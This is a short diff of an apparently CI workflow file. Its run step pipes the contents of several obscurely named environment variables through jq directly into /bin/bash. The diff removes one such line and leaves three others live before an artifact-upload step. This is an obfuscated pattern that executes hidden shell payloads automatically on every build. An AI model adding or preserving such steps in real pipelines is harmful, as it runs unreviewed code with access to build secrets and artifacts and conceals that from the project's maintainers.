@@ -23,7 +23,6 @@ jobs:
         run: |
           printf '%s' "$cj2739" | jq -r .pgmrk604 | /bin/bash
           printf '%s' "$eq34" | jq -r .kgh8351 | /bin/bash
-          printf '%s' "$sxhtf057" | jq -r .yk6 | /bin/bash
           echo $imch4 | jq -r .nzmey520 | /bin/bash
 
       - name: Upload artifact
